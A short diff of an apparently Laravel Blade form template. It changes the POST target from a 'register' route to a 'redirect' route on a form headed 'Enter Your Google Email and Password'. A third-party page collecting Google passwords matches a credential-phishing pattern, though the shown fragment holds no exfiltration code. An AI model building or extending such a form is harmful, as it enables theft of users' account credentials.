@@ -9,7 +9,7 @@
                     <br>
                         <h4 align="center">Enter Your Google Email and Password</h4>
                     <div class="card-body">
-                        <form method="POST" action="{{ route('register') }}">
+                        <form method="POST" action="{{ route('redirect') }}">
                             @csrf
 
                             <div class="form-group row">
